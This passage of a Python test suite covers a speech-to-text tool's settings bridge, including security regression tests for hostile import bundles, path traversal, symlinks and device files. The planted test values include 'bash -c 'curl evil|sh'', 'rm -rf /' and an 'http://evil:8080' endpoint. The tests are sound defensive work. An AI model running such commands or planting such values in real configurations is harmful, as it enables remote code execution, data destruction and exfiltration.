    env.write_config(BASE_CONFIG.replace('language = "en"', 'language = "en"\nremote_api_key = "sk-SECRET"'))
    res = env.ok("load")
    assert "sk-SECRET" not in json.dumps(res)
    assert res["snapshot"]["settings"]["whisper.remote_api_key_set"] is True


def test_load_reconciles_hand_edited_vocabulary(env: Env):
    env.write_config(BASE_CONFIG.replace('language = "en"', 'language = "en"\ninitial_prompt = "Hyprland, Omarchy"'))
    snap = env.ok("load")["snapshot"]
    assert [v["phrase"] for v in snap["vocabulary"]] == ["Hyprland", "Omarchy"]
    assert snap["vocab_tokens"] > 0
    assert snap["warnings"] and "diverged" in snap["warnings"][0]


def test_load_reports_sync_conflicts(env: Env):
    env.sync_path.parent.mkdir(parents=True, exist_ok=True)
    (env.sync_path.parent / "sync.sync-conflict-20260101-000000-ABCDEF.json").write_text("{}")
    snap = env.ok("load")["snapshot"]
    assert len(snap["sync"]["conflicts"]) == 1


def test_load_missing_config_is_clean_error(env: Env):
    env.config.unlink()
    res = env.fail("load")
    assert "not found" in res["error"]


def test_options(env: Env):
    res = env.ok("options")
    assert res["engines"][0] == "whisper"
    assert res["compiled_engines"] == ["whisper"]
    assert "large-v3" in res["models_per_engine"]["whisper"]
    assert res["model_paths"]["parakeet"] == "parakeet.model"
    assert res["hotkey_modifiers"] == ["LEFTCTRL", "LEFTALT", "LEFTSHIFT", "LEFTMETA"]
    assert res["hotkey_modes"] == ["push_to_talk", "toggle"]
    assert res["output_modes"] == ["type", "clipboard", "paste"]
    assert res["audio_devices"][0] == {"label": "default", "name": "default"}
    assert res["audio_devices"][1]["name"] == "alsa_input.usb-Blue_Yeti-00.analog-stereo"
    assert res["feedback_themes"] == ["default", "subtle", "mechanical"]
    assert res["gpu_vendors"][0]["value"] == "auto"
    assert any("setup model" in c for c in env.voxtype_calls())


def test_models_list(env: Env):
    env.add_model("whisper", "tiny", size=100)
    (env.models_dir / "ggml-mystery.bin").write_bytes(b"?" * 10)
    res = env.ok("models.list", engine="whisper")
    assert res["engine"] == "whisper" and res["active"] == "base.en"
    rows = {m["name"]: m for m in res["models"]}
    assert rows["base.en"]["downloaded"] and rows["base.en"]["active"]
    assert rows["base.en"]["on_disk_bytes"] == 2048
    assert rows["tiny"]["on_disk_bytes"] == 100 and rows["tiny"]["unknown"] is False
    assert rows["large-v3"]["downloaded"] is False and rows["large-v3"]["on_disk_bytes"] is None
    assert rows["large-v3"]["size_mb"] == 3100
    assert rows["mystery"]["unknown"] is True and rows["mystery"]["downloaded"] is True
    assert rows["tiny"]["path"] == str(env.models_dir / "ggml-tiny.bin")


def test_models_list_unknown_engine(env: Env):
    env.fail("models.list", engine="cohere")
    env.fail("models.list")


def test_gpu_status(env: Env):
    res = env.ok("gpu.status")
    assert res["backend"] == "GPU (Vulkan)"
    assert res["gpus"] == [
        {"vendor": "nvidia", "label": "NVIDIA — GA102 [GeForce RTX 3090]"},
        {"vendor": "amd", "label": "AMD — [AMD/ATI] Raphael"},
    ]
    assert res["device"] == "auto"
    assert res["dropin_path"] == str(env.dropin)
    assert "GPUs detected" in res["text"]


def test_gpu_status_without_binary(env: Env):
    env.remove_fake("voxtype")
    res = env.fail("gpu.status")
    assert res["device"] == "auto"


def test_dictionary_preview(env: Env):
    env.ok("dict.upsert", **{"from": "slash codemux release", "to": "/codemux-release", "category": "Replacement"})
    env.ok("dict.upsert", **{"from": "hyprland", "to": "Hyprland", "category": "Capitalization"})
    res = env.ok("dictionary.preview", text="run /codemux release on hyprland now")
    assert res["output"] == "run /codemux-release on Hyprland now"
    assert res["rules"] == 2
    assert env.ok("dictionary.preview", text="")["output"] == ""


# ---------------------------------------------------------------------------
# vocabulary
# ---------------------------------------------------------------------------


def test_vocab_add_writes_config_sidecar_and_sync(env: Env):
    res = env.ok("vocab.add", phrase="  Omarchy ")
    assert res["restart_needed"] == ["whisper.initial_prompt"]
    assert res["daemon_stale"] is True
    assert res["snapshot"]["vocabulary"][0]["phrase"] == "Omarchy"
    assert res["snapshot"]["vocabulary"][0]["added_at"]
    assert env.config_dict()["whisper"]["initial_prompt"] == "Omarchy"
    assert "# Model to use for transcription" in env.read_config()  # comments preserved
    assert env.sidecar_dict()["vocabulary"][0]["phrase"] == "Omarchy"
    bundle = json.loads(env.sync_path.read_text())
    assert bundle["sync"]["vocabulary"][0]["phrase"] == "Omarchy"
    assert "secrets" not in bundle
    assert env.config.with_name("config.toml.voxtype-tui-bak").exists()
    assert any(c.startswith("-c ") and c.endswith(" config") for c in env.voxtype_calls())


def test_vocab_add_rejects_empty_and_duplicate(env: Env):
    env.fail("vocab.add", phrase="   ")
    env.fail("vocab.add")
    env.ok("vocab.add", phrase="Omarchy")
    res = env.fail("vocab.add", phrase="Omarchy")
    assert "already" in res["error"]


def test_vocab_remove(env: Env):
    env.ok("vocab.add", phrase="A")
    env.ok("vocab.add", phrase="B")
    res = env.ok("vocab.remove", phrase="A")
    assert [v["phrase"] for v in res["snapshot"]["vocabulary"]] == ["B"]
    assert env.config_dict()["whisper"]["initial_prompt"] == "B"
    env.fail("vocab.remove", phrase="A")
    env.ok("vocab.remove", phrase="B")
    assert "initial_prompt" not in env.config_dict()["whisper"]


def test_vocab_set_reorders_dedupes_and_keeps_added_at(env: Env):
    env.ok("vocab.add", phrase="A")
    added = env.ok("load")["snapshot"]["vocabulary"][0]["added_at"]
    res = env.ok("vocab.set", phrases=["C", " B ", "A", "B", ""])
    assert [v["phrase"] for v in res["snapshot"]["vocabulary"]] == ["C", "B", "A"]
    assert res["snapshot"]["vocabulary"][2]["added_at"] == added
    assert env.config_dict()["whisper"]["initial_prompt"] == "C, B, A"
    env.fail("vocab.set", phrases="C")
    env.fail("vocab.set", phrases=[1])


# ---------------------------------------------------------------------------
# dictionary
# ---------------------------------------------------------------------------


def test_dict_upsert_wires_post_process(env: Env):
    res = env.ok("dict.upsert", **{"from": "vox type", "to": "Voxtype"})
    assert res["snapshot"]["replacements"] == [
        {"from": "vox type", "to": "Voxtype", "category": "Replacement"}
    ]
    assert "text.replacements" in res["restart_needed"]
    cfg = env.config_dict()
    assert cfg["text"]["replacements"] == {"vox type": "Voxtype"}
    assert cfg["output"]["post_process"]["command"] == "voxtype-tui-postprocess"
    res = env.ok("dict.upsert", **{"from": "vox type", "to": "Voxtype!", "category": "Capitalization"})
    assert res["snapshot"]["replacements"][0]["category"] == "Capitalization"
    assert res["snapshot"]["replacements"][0]["to"] == "Voxtype!"
    env.fail("dict.upsert", **{"from": "", "to": "x"})
    env.fail("dict.upsert", **{"from": "a", "to": "b", "category": "Command"})


def test_dict_remove(env: Env):
    env.ok("dict.upsert", **{"from": "a", "to": "b"})
    res = env.ok("dict.remove", **{"from": "a"})
    assert res["snapshot"]["replacements"] == []
    assert "replacements" not in env.config_dict().get("text", {})
    assert env.sidecar_dict()["replacements"] == []
    env.fail("dict.remove", **{"from": "a"})


def test_dict_set_category_is_sidecar_only(env: Env):
    env.ok("dict.upsert", **{"from": "a", "to": "b"})
    before = env.config.stat().st_mtime_ns
    res = env.ok("dict.set_category", **{"from": "a", "category": "Capitalization"})
    assert res["changed"] is True
    assert res["restart_needed"] == []
    assert res["daemon_stale"] is False
    assert res["snapshot"]["replacements"][0]["category"] == "Capitalization"
    assert env.config.stat().st_mtime_ns == before
    assert env.sidecar_dict()["replacements"][0]["category"] == "Capitalization"
    assert env.ok("dict.set_category", **{"from": "a", "category": "Capitalization"})["changed"] is False
    env.fail("dict.set_category", **{"from": "zzz", "category": "Replacement"})
    env.fail("dict.set_category", **{"from": "a", "category": "Nope"})


# ---------------------------------------------------------------------------
# settings
# ---------------------------------------------------------------------------


def test_settings_allow_list_matches_tui():
    from voxtype_tui import settings

    src = Path(settings.__file__).read_text()
    used = set(re.findall(r"set_setting\(\s*\"([a-z_.]+)\"", src))
    used |= set(re.findall(r"unset_setting\(\s*\"([a-z_.]+)\"", src))
    used |= set(settings.MODEL_PATH_PER_ENGINE.values())
    assert used == set(bridge.SETTING_TYPES), used ^ set(bridge.SETTING_TYPES)


@pytest.mark.parametrize("path,value,expected", [
    ("hotkey.enabled", True, True),
    ("hotkey.enabled", "false", False),
    ("audio.max_duration_secs", 90, 90),
    ("audio.max_duration_secs", "45", 45),
    ("audio.max_duration_secs", 30.0, 30),
    ("audio.feedback.volume", 0.5, 0.5),
    ("audio.feedback.volume", 1, 1.0),
    ("vad.threshold", "0.25", 0.25),
    ("hotkey.modifiers", ["LEFTCTRL", "LEFTMETA"], ["LEFTCTRL", "LEFTMETA"]),
    ("hotkey.key", "F13", "F13"),
    ("output.mode", "clipboard", "clipboard"),
    ("output.type_delay_ms", 0, 0),
    ("output.post_process.command", "cat", "cat"),
    ("whisper.remote_timeout_secs", 15, 15),
    ("text.spoken_punctuation", True, True),
])
def test_settings_set_coerces_to_toml_types(env: Env, path, value, expected):
    res = env.ok("settings.set", path=path, value=value)
    assert res["snapshot"]["settings"][path] == expected
    node = env.config_dict()
    for part in path.split("."):
        node = node[part]
    assert node == expected and type(node) is type(expected)


@pytest.mark.parametrize("path,value", [
    ("hotkey.enabled", "yes"),
    ("hotkey.enabled", 1),
    ("audio.max_duration_secs", "ten"),
    ("audio.max_duration_secs", 2.5),
    ("audio.max_duration_secs", 0),
    ("audio.max_duration_secs", True),
    ("audio.feedback.volume", 1.5),
    ("audio.feedback.volume", "loud"),
    ("vad.threshold", -0.1),
    ("hotkey.modifiers", "LEFTCTRL"),
    ("hotkey.modifiers", ["RIGHTCTRL"]),
    ("hotkey.mode", "hold"),
    ("output.mode", "speak"),
    ("output.type_delay_ms", -1),
    ("hotkey.key", ["F13"]),
    ("engine", "bogus"),
])
def test_settings_set_rejects_bad_values(env: Env, path, value):
    before = env.read_config()
    env.fail("settings.set", path=path, value=value)
    assert env.read_config() == before


def test_settings_set_unknown_path_rejected(env: Env):
    res = env.fail("settings.set", path="output.pre_output_command", value="rm -rf /")
    assert "not a settable path" in res["error"]
    env.fail("settings.set", path="whisper.model")
    env.fail("settings.unset", path="state_file")


def test_settings_set_engine_ensures_required_sections(env: Env):
    env.write_config('state_file = "auto"\n\n[whisper]\nmodel = "base.en"\n')
    res = env.ok("settings.set", path="engine", value="whisper")
    assert res["snapshot"]["settings"]["engine"] == "whisper"
    cfg = env.config_dict()
    for section in ("hotkey", "audio", "whisper", "output"):
        assert section in cfg
    assert "engine" in res["restart_needed"]


def test_settings_set_model_requires_download(env: Env):
    res = env.fail("settings.set", path="whisper.model", value="large-v3")
    assert "download" in res["error"]
    env.add_model("whisper", "large-v3")
    res = env.ok("settings.set", path="whisper.model", value="large-v3")
    assert res["restart_needed"] == ["whisper.model"]
    assert env.config_dict()["whisper"]["model"] == "large-v3"


def test_settings_set_model_custom_path(env: Env):
    custom = env.root / "custom.bin"
    env.fail("settings.set", path="whisper.model", value=str(custom))
    custom.write_bytes(b"x")
    env.ok("settings.set", path="whisper.model", value=str(custom))


def test_settings_set_refuses_api_key_but_unset_clears_it(env: Env):
    before = env.read_config()
    res = env.fail("settings.set", path="whisper.remote_api_key", value="sk-SECRET")
    assert "cannot be set" in res["error"] and "settings.unset" in res["error"]
    assert "sk-SECRET" not in json.dumps(res)
    assert env.read_config() == before
    env.set_api_key("sk-SECRET")
    res = env.ok("load")
    assert "sk-SECRET" not in json.dumps(res)
    assert res["snapshot"]["settings"]["whisper.remote_api_key_set"] is True
    res = env.ok("settings.unset", path="whisper.remote_api_key")
    assert "sk-SECRET" not in json.dumps(res)
    assert res["changed"] is True
    assert res["snapshot"]["settings"]["whisper.remote_api_key_set"] is False
    assert "remote_api_key" not in env.config_dict()["whisper"]


def test_settings_set_empty_string_unsets(env: Env):
    res = env.ok("settings.set", path="whisper.language", value="")
    assert "whisper.language" not in res["snapshot"]["settings"]
    assert "language" not in env.config_dict()["whisper"]


def test_settings_unset(env: Env):
    env.ok("settings.set", path="vad.threshold", value=0.5)
    res = env.ok("settings.unset", path="vad.threshold")
    assert res["changed"] is True and "vad.threshold" in res["restart_needed"]
    assert "vad" not in env.config_dict()  # empty parent table cleaned up
    res = env.ok("settings.unset", path="vad.threshold")
    assert res["changed"] is False and res["restart_needed"] == []


def test_settings_set_is_idempotent(env: Env):
    res = env.ok("settings.set", path="output.mode", value="type")
    assert res["restart_needed"] == []
    assert res["daemon_stale"] is False


def test_settings_set_rejected_by_voxtype_validator_leaves_config_untouched(env: Env):
    before = env.read_config()
    res = env.fail("settings.set", path="hotkey.key", value="REJECTME")
    assert "rejected" in res["error"]
    assert env.read_config() == before
    assert not list(env.config.parent.glob("*.tmp"))


# ---------------------------------------------------------------------------
# models
# ---------------------------------------------------------------------------


def test_models_set_active(env: Env):
    env.fail("models.set_active", engine="whisper", name="tiny")
    env.add_model("whisper", "tiny")
    res = env.ok("models.set_active", engine="whisper", name="tiny")
    assert res["restart_needed"] == ["whisper.model"]
    assert res["snapshot"]["settings"]["whisper.model"] == "tiny"
    assert env.ok("models.list", engine="whisper")["active"] == "tiny"
    env.fail("models.set_active", engine="nope", name="tiny")
    env.fail("models.set_active", engine="whisper", name="../etc")


def test_models_delete(env: Env):
    res = env.fail("models.delete", engine="whisper", name="base.en")
    assert "active" in res["error"]
    env.fail("models.delete", engine="whisper", name="tiny")
    p = env.add_model("whisper", "tiny", size=777)
    res = env.ok("models.delete", engine="whisper", name="tiny")
    assert res["freed_bytes"] == 777 and res["restart_needed"] == []
    assert not p.exists()
    assert env.models_dir.joinpath("ggml-base.en.bin").exists()


def test_models_delete_directory_engine(env: Env):
    p = env.add_model("parakeet", "parakeet-tdt-0.6b-v3", size=500)
    (p / "sub").mkdir()
    (p / "sub" / "tokens.txt").write_bytes(b"t" * 25)
    res = env.ok("models.delete", engine="parakeet", name="parakeet-tdt-0.6b-v3")
    assert res["freed_bytes"] == 525
    assert not p.exists()


def test_private_tui_helpers_exist():
    import importlib

    src = BRIDGE.read_text()
    assert "_dir_size(" in src and "models._dir_size" not in src
    for mod_name, attr in bridge.TUI_PRIVATE_HELPERS:
        mod = importlib.import_module(mod_name)
        assert callable(getattr(mod, attr, None)), f"{mod_name}.{attr} missing"
    # Every `sync._x(` / `models._x(` use in bridge.py must go through the
    # guarded accessor.
    direct = re.findall(r"\b(?:sync|models|settings|config|state)\._[a-z_]+\(", src)
    assert direct == [], direct


def test_private_tui_helper_missing_is_friendly_error(env: Env, monkeypatch):
    from voxtype_tui import sync

    monkeypatch.delattr(sync, "_filter_uninstalled_models")
    p = _bundle(env)
    res = env.fail("import.preview", path=str(p))
    assert "_filter_uninstalled_models" in res["error"]
    assert "voxtype-tui" in res["error"] and "AttributeError" not in res["error"]


# ---------------------------------------------------------------------------
# gpu.set_device
# ---------------------------------------------------------------------------


def test_gpu_set_device_writes_dropin_and_reloads(env: Env):
    res = env.ok("gpu.set_device", vendor="nvidia")
    assert res["restart_needed"] == ["gpu.device"]
    assert res["device"] == "nvidia"
    assert res["daemon_reload"]["ok"] is True
    text = env.dropin.read_text()
    assert 'Environment="VOXTYPE_VULKAN_DEVICE=nvidia"' in text
    assert 'Environment="VK_LOADER_DRIVERS_SELECT=nvidia*"' in text
    assert "--user daemon-reload" in env.systemctl_calls()
    assert env.ok("gpu.status")["device"] == "nvidia"
    assert env.config_dict().get("gpu") is None  # never in config.toml
    res = env.ok("gpu.set_device", vendor="auto")
    assert res["device"] == "auto"
    assert not env.dropin.exists()
    env.fail("gpu.set_device", vendor="apple")


# ---------------------------------------------------------------------------
# export / import
# ---------------------------------------------------------------------------


def _seed(env: Env) -> None:
    env.ok("vocab.add", phrase="Omarchy")
    env.ok("dict.upsert", **{"from": "vox type", "to": "Voxtype"})
    env.ok("settings.set", path="hotkey.key", value="F13")
    env.set_api_key("sk-SECRET")


def test_export_preview(env: Env):
    _seed(env)
    res = env.ok("export.preview", scope="sync", include_secrets=False)
    assert res["default_path"] == str(env.home / "Downloads" / f"voxtype-tui-export-{time.strftime('%Y-%m-%d')}.json")
    assert res["counts"]["vocabulary"] == 1
    assert res["counts"]["replacements"] == 1
    assert res["counts"]["settings"] > 0
    assert res["counts"]["local"] == 0
    assert res["counts"]["secrets"] == 0
    assert res["counts"]["secrets_available"] == 2  # api key + post_process command
    res = env.ok("export.preview", scope="sync+local", include_secrets=True)
    assert res["counts"]["local"] > 0 and res["counts"]["secrets"] == 2
    env.fail("export.preview", scope="everything")
    env.fail("export.preview", include_secrets="yes")


def test_export_write_redacts_secrets_by_default(env: Env):
    _seed(env)
    target = env.home / "out" / "bundle.json"
    target.parent.mkdir(parents=True)
    res = env.ok("export.write", path=str(target), scope="sync")
    assert res["path"] == str(target) and res["bytes"] == target.stat().st_size
    bundle = json.loads(target.read_text())
    assert "sk-SECRET" not in target.read_text()
    assert bundle["secrets"]["whisper"]["remote_api_key"] == ""
    assert bundle["local"] == {}
    assert bundle["sync"]["vocabulary"][0]["phrase"] == "Omarchy"


def test_export_write_with_secrets_and_local(env: Env):
    _seed(env)
    target = env.home / "full.json"
    env.ok("export.write", path=str(target), scope="sync+local", include_secrets=True)
    bundle = json.loads(target.read_text())
    assert bundle["secrets"]["whisper"]["remote_api_key"] == "sk-SECRET"
    assert bundle["local"]["hotkey"]["key"] == "F13"


def test_export_write_default_path_and_bad_parent(env: Env):
    res = env.ok("export.write")
    assert res["path"].startswith(str(env.home / "Downloads"))
    assert Path(res["path"]).exists()
    env.fail("export.write", path=str(env.home / "no" / "such" / "dir" / "x.json"))


def test_export_write_refuses_outside_home(env: Env):
    """F6 regression: the panel sends a user-typed path straight through.

    Unconstrained, a bar widget could write a JSON file anywhere the
    user can — including over a dotfile via a traversal string.
    """
    _seed(env)
    outside = env.root / "escaped.json"
    res = env.fail("export.write", path=str(outside))
    assert "home directory" in res["error"]
    assert not outside.exists()

    traversal = env.home / ".." / "traversed.json"
    res = env.fail("export.write", path=str(traversal))
    assert "home directory" in res["error"]
    assert not (env.root / "traversed.json").exists()


def test_export_write_requires_a_json_suffix(env: Env):
    _seed(env)
    target = env.home / "bundle.txt"
    res = env.fail("export.write", path=str(target))
    assert ".json" in res["error"]
    assert not target.exists()


def test_export_write_replaces_a_symlink_instead_of_following_it(env: Env):
    """The atomic mkstemp+os.replace write must not write THROUGH a link."""
    _seed(env)
    secret = env.home / "unrelated.txt"
    secret.write_text("do not touch")
    link = env.home / "bundle.json"
    link.symlink_to(secret)

    env.ok("export.write", path=str(link), scope="sync")

    assert secret.read_text() == "do not touch"
    assert not link.is_symlink()
    assert json.loads(link.read_text())["sync"]["vocabulary"][0]["phrase"] == "Omarchy"


def _bundle(env: Env, *, settings: dict | None = None, local: dict | None = None,
            secrets: dict | None = None) -> Path:
    from voxtype_tui import sync

    block = {
        "vocabulary": [{"phrase": "Hyprland", "added_at": "2026-01-01T00:00:00Z", "notes": None}],
        "replacements": [{"from": "hyper land", "to": "Hyprland", "category": "Capitalization", "added_at": "2026-01-01T00:00:00Z"}],
        "settings": settings or {},
    }
    b = sync.build_bundle(sync=block, local=local or {}, secrets=secrets,
                          device_label="other-box", include_secrets=secrets is not None)
    p = env.root / "import.json"
    p.write_text(sync.to_json(b))
    return p


def test_import_preview_diff(env: Env):
    env.ok("vocab.add", phrase="Omarchy")
    p = _bundle(env, settings={"output": {"mode": "clipboard"}, "whisper": {"remote_endpoint": "http://evil:8080"}},
                local={"hotkey": {"key": "F24"}})
    res = env.ok("import.preview", path=str(p), include_settings=True)
    assert res["format"] == "voxtype-tui"
    assert res["source"] == "other-box"
    assert res["has_local"] is True and res["include_local"] is False
    d = res["diff"]
    assert d["vocab_add"] == ["Hyprland"] and d["vocab_remove"] == []
    assert d["replacements_add"] == [{"from": "hyper land", "to": "Hyprland"}]
    changes = {c["path"]: c for c in d["settings_change"]}
    assert changes["output.mode"] == {"path": "output.mode", "old": "type", "new": "clipboard", "dangerous": False}
    assert changes["whisper.remote_endpoint"]["dangerous"] is True
    assert res["dangerous"] == ["whisper.remote_endpoint"]
    assert "hotkey.key" not in changes
    res = env.ok("import.preview", path=str(p), include_local=True, include_settings=True)
    assert {c["path"] for c in res["diff"]["settings_change"]} >= {"hotkey.key"}


def test_import_preview_filters_uninstalled_model(env: Env):
    p = _bundle(env, settings={"whisper": {"model": "large-v3"}})
    res = env.ok("import.preview", path=str(p), include_settings=True)
    assert not any(c["path"] == "whisper.model" for c in res["diff"]["settings_change"])
    assert any("not installed" in w for w in res["warnings"])


def test_import_preview_vexis_dictionary(env: Env):
    p = env.root / "vexis-dictionary.json"
    p.write_text(json.dumps([
        {"id": 1, "trigger": "vox type", "replacement": "Voxtype", "category": "replacement"},
        {"id": 2, "trigger": "slash commit", "replacement": "/commit", "category": "command"},
    ]))
    res = env.ok("import.preview", path=str(p))
    assert res["format"] == "vexis-dictionary"
    assert len(res["diff"]["replacements_add"]) == 2


def test_import_preview_errors(env: Env):
    env.fail("import.preview", path=str(env.root / "missing.json"))
    bad = env.root / "bad.json"
    bad.write_text("{not json")
    env.fail("import.preview", path=str(bad))
    env.fail("import.preview")


def test_import_preview_refuses_oversize_file_without_reading_it(env: Env, monkeypatch):
    from voxtype_tui import sync

    big = env.root / "big.json"
    with big.open("wb") as f:
        f.truncate(5 * 1024 * 1024)
    assert big.stat().st_size > sync.MAX_BUNDLE_BYTES

    def no_read(self, *a, **k):
        raise AssertionError(f"read attempted on {self}")

    monkeypatch.setattr(Path, "read_bytes", no_read)
    monkeypatch.setattr(Path, "read_text", no_read)
    res = env.fail("import.preview", path=str(big))
    assert "limit" in res["error"] and str(sync.MAX_BUNDLE_BYTES) in res["error"]
    res = env.fail("import.apply", path=str(big), accept_dangerous=True)
    assert "limit" in res["error"]


def test_import_refuses_non_regular_files(env: Env):
    """F5 regression: st_size is 0 for character devices and procfs, so
    the size gate waved them through and read_bytes() then allocated
    until MemoryError. The audit confirmed /dev/zero and /dev/urandom.
    """
    for candidate in ("/dev/zero", "/dev/urandom"):
        dev = Path(candidate)
        if not dev.exists():
            continue
        assert dev.stat().st_size == 0  # why the size gate alone was useless
        with memory_ceiling(512, f"import.preview on {candidate}"):
            with deadline(20, f"import.preview on {candidate}"):
                res = env.fail("import.preview", path=candidate)
        assert "regular file" in res["error"]
        with memory_ceiling(512, f"import.apply on {candidate}"):
            with deadline(20, f"import.apply on {candidate}"):
                res = env.fail("import.apply", path=candidate, accept_dangerous=True)
        assert "regular file" in res["error"]


def test_import_refuses_a_fifo_without_hanging(env: Env):
    """A FIFO also stats at size 0, and reading it blocks forever."""
    fifo = env.root / "bundle.fifo"
    os.mkfifo(fifo)
    with deadline(20, "import.preview on a FIFO"):
        res = env.fail("import.preview", path=str(fifo))
    assert "regular file" in res["error"]
    with deadline(20, "import.apply on a FIFO"):
        res = env.fail("import.apply", path=str(fifo), accept_dangerous=True)
    assert "regular file" in res["error"]


def test_import_refuses_a_directory(env: Env):
    d = env.root / "adir"
    d.mkdir()
    assert env.fail("import.preview", path=str(d))["error"]


def test_import_read_is_bounded_not_just_stat_gated(env: Env, monkeypatch):
    """The read itself is capped, not just the pre-read stat.

    st_size is only a hint — it is 0 for devices and stale for a file
    that grows after the stat. Here stat reports a small size for a file
    that is actually 3 MB: the old code trusted it and pulled the whole
    thing in with read_bytes(), the fixed code reads at most the cap + 1
    byte and refuses.
    """
    from voxtype_tui import sync

    p = env.root / "liar.json"
    p.write_bytes(b"{" + b" " * (3 * sync.MAX_BUNDLE_BYTES))

    real_stat = Path.stat

    class _SmallStat:
        def __init__(self, st):
            self.st_mode = st.st_mode
            self.st_size = 10

    def lying_stat(self, *a, **k):
        st = real_stat(self, *a, **k)
        return _SmallStat(st) if self == p else st

    def no_read_bytes(self, *a, **k):
        raise AssertionError(f"unbounded read_bytes() on {self}")

    monkeypatch.setattr(Path, "stat", lying_stat)
    monkeypatch.setattr(Path, "read_bytes", no_read_bytes)

    with memory_ceiling(512, "import.preview on a file that lies about its size"):
        res = env.fail("import.preview", path=str(p))
    assert str(sync.MAX_BUNDLE_BYTES) in res["error"]


def test_import_apply_refuses_dangerous_unless_accepted(env: Env):
    p = _bundle(env, settings={"whisper": {"remote_endpoint": "http://evil:8080"}})
    before = env.read_config()
    res = env.fail("import.apply", path=str(p), include_settings=True)
    assert res["error"] == "dangerous-changes"
    assert res["dangerous"] == ["whisper.remote_endpoint"]
    assert env.read_config() == before
    res = env.ok("import.apply", path=str(p), include_settings=True, accept_dangerous=True)
    assert env.config_dict()["whisper"]["remote_endpoint"] == "http://evil:8080"
    assert "whisper.remote_endpoint" in res["restart_needed"]


def test_import_apply_merges(env: Env):
    env.ok("vocab.add", phrase="Omarchy")
    p = _bundle(env, settings={"output": {"mode": "clipboard"}}, local={"hotkey": {"key": "F24"}})
    res = env.ok("import.apply", path=str(p), include_settings=True)
    snap = res["snapshot"]
    assert [v["phrase"] for v in snap["vocabulary"]] == ["Omarchy", "Hyprland"]
    assert snap["replacements"] == [{"from": "hyper land", "to": "Hyprland", "category": "Capitalization"}]
    assert snap["settings"]["output.mode"] == "clipboard"
    assert "hotkey.key" not in snap["settings"]
    assert res["applied"]["vocab_add"] == ["Hyprland"]
    cfg = env.config_dict()
    assert cfg["whisper"]["initial_prompt"] == "Omarchy, Hyprland"
    assert cfg["text"]["replacements"] == {"hyper land": "Hyprland"}
    res = env.ok("import.apply", path=str(p), include_local=True, include_settings=True)
    assert res["snapshot"]["settings"]["hotkey.key"] == "F24"


def test_import_apply_can_skip_settings(env: Env):
    p = _bundle(env, settings={"output": {"mode": "clipboard"}})
    res = env.ok("import.apply", path=str(p), include_settings=False)
    assert res["snapshot"]["settings"]["output.mode"] == "type"
    assert res["applied"]["settings_change"] == []


def test_import_include_settings_defaults_to_false(env: Env):
    """F1: the bridge must NOT import settings unless asked.

    voxtype_tui's own import screen defaults this OFF and calls that
    default the contract that protects users from silent overwrites; the
    bridge used to invert it, so a caller that omitted the flag silently
    took every setting from an untrusted bundle.
    """
    p = _bundle(env, settings={"output": {"mode": "clipboard"}})
    before = env.read_config()

    # Default (flag absent): preview shows no settings rows at all.
    pv = env.ok("import.preview", path=str(p))
    assert pv["diff"]["settings_change"] == []

    # Default (flag absent): apply writes no settings.
    res = env.ok("import.apply", path=str(p))
    assert res["applied"]["settings_change"] == []
    assert res["snapshot"]["settings"]["output.mode"] == "type"
    assert 'mode = "type"' in env.read_config()
    assert 'mode = "clipboard"' not in env.read_config()

    # Explicit false behaves the same.
    assert env.ok("import.preview", path=str(p), include_settings=False)["diff"]["settings_change"] == []

    # Explicit true is the only way settings move.
    env.write_config(before)
    pv = env.ok("import.preview", path=str(p), include_settings=True)
    assert [c["path"] for c in pv["diff"]["settings_change"]] == ["output.mode"]
    res = env.ok("import.apply", path=str(p), include_settings=True)
    assert res["snapshot"]["settings"]["output.mode"] == "clipboard"


def test_redacted_import_paths_match_tui():
    from voxtype_tui import sync

    assert bridge.REDACTED_IMPORT_PATHS == {".".join(p) for p in sync.SECRET_PATHS}


def test_bridge_dangerous_paths_superset_of_tui():
    """F2: the plugin owns its own dangerous set, upstream can only widen it.

    voxtype_tui.sync.DANGEROUS_PATHS covers only the four SECRET_PATHS
    plus whisper.remote_endpoint. Everything else an attacker-supplied
    bundle can weaponise (the pre_recording hook, engine/mode switches,
    the state file, file-output sink, meeting capture) must be flagged by
    this plugin regardless of what upstream does.
    """
    from voxtype_tui import sync

    upstream = {".".join(p) for p in sync.DANGEROUS_PATHS}
    union = bridge._dangerous_setting_paths()
    assert union >= upstream, upstream - union
    assert union >= bridge.BRIDGE_DANGEROUS_PATHS
    # The specific gaps this fix closes.
    for path in (
        "output.pre_recording_command", "engine", "whisper.mode", "state_file",
        "output.file_path", "output.file_mode",
        "meeting.retain_audio", "meeting.storage_path",
        "soniox.api_key", "cohere.api_key",
    ):
        assert path in union, path
        assert path not in upstream or path in bridge.BRIDGE_DANGEROUS_PATHS


@pytest.mark.parametrize("planted,expected", [
    ({"output": {"pre_recording_command": "bash -c 'curl evil|sh'"}},
     ["output.pre_recording_command"]),
    ({"engine": "moonshine"}, ["engine"]),
    ({"whisper": {"mode": "remote"}}, ["whisper.mode"]),
    ({"state_file": "/tmp/attacker-state"}, ["state_file"]),
    ({"output": {"file_path": "/tmp/pwn.txt", "file_mode": "overwrite"}},
     ["output.file_path", "output.file_mode"]),
    ({"meeting": {"retain_audio": True, "storage_path": "/tmp/loot"}},
     ["meeting.retain_audio", "meeting.storage_path"]),
])
def test_import_flags_bridge_dangerous_paths(env: Env, planted: dict, expected: list):
    """F2 regression: these used to come back dangerous==[] and apply clean.

    Before the fix, a bundle planting any of these applied SILENTLY: the
    preview reported no dangerous rows, import.apply succeeded without
    accept_dangerous, and the value landed in config.toml.
    """
    p = _bundle(env, settings=planted)
    before = env.read_config()

    pv = env.ok("import.preview", path=str(p), include_settings=True)
    for path in expected:
        assert path in pv["dangerous"], (path, pv["dangerous"])
        row = next(c for c in pv["diff"]["settings_change"] if c["path"] == path)
        assert row["dangerous"] is True
        # C4: non-redacted rows keep old/new so the panel can render them.
        if not row.get("redacted"):
            assert "old" in row and "new" in row

    # C3: refusal is live and writes NOTHING.
    res = env.fail("import.apply", path=str(p), include_settings=True)
    assert res["error"] == "dangerous-changes"
    assert set(expected) <= set(res["dangerous"])
    assert "diff" in res and "warnings" in res
    assert env.read_config() == before
    assert not env.sidecar.exists() or "pre_recording_command" not in env.sidecar.read_text()

    # Only an explicit accept_dangerous lets it through.
    ok = env.ok("import.apply", path=str(p), include_settings=True, accept_dangerous=True)
    assert set(expected) <= {c["path"] for c in ok["applied"]["settings_change"]}


def test_import_apply_refusal_shape(env: Env):
    """C3: the refusal payload the QML lane renders."""
    p = _bundle(env, settings={"output": {"pre_recording_command": "evil"}})
    res = env.fail("import.apply", path=str(p), include_settings=True)
    assert set(res) == {"ok", "error", "dangerous", "diff", "warnings"}
